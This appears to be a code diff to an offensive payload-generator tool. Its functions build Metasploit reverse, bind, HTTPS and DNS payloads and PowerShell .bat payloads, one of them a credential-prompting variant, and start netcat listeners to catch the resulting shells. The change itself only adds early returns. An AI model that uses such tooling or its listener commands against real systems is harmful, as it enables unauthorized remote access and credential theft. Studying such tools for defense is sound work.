@@ -45,7 +45,10 @@ def reversePayloadGeneration(payloadchoice,payloadname):
         ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'reverse')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startRevMetasploit(portnum)
+    return False
     raise KeyboardInterrupt
+
+
 
 def bindPayloadGeneration(payloadchoice,payloadname):
     bindport = raw_input(
@@ -64,6 +67,8 @@ def bindPayloadGeneration(payloadchoice,payloadname):
     ez2read_shellcode, startBindMetasploit = askAndReturnModules(shellcode,'bind')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startBindMetasploit(bindport,bindip)
+    return False
+    raise KeyboardInterrupt
 
 def httpsPayloadGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('443')
@@ -79,6 +84,8 @@ def httpsPayloadGeneration(payloadchoice,payloadname):
     ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startHttpsMetasploit(portnum)
+    return False
+    raise KeyboardInterrupt
 
 def dnsPayloadGeneration(payloadchoice,payloadname):
     portnum = raw_input(
@@ -97,10 +104,14 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startHttpsMetasploit(portnum,DNSaddr)
+    return False
+    raise KeyboardInterrupt
 
 def reversePowerShellInterpreterGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
     startSocket(ipaddr, portnum)
+    return False
+    raise KeyboardInterrupt
 
 def reversePowerShellGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
@@ -111,6 +122,7 @@ def reversePowerShellGeneration(payloadchoice,payloadname):
     powershellbatfile.close()
     print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
     os.system('nc -lvp %s'%portnum)
+    return False
     raise KeyboardInterrupt
 
 def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
@@ -123,6 +135,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
     os.system('nc -lvp %s | nc -lvp 80 &'%(portnum))
     os.system('firefox 127.0.0.1')
+    return False
     raise KeyboardInterrupt
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
@@ -134,4 +147,5 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     powershellbatfile.close()
     print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
     os.system('nc -lvp %s'%(portnum))
+    return False
     raise KeyboardInterrupt
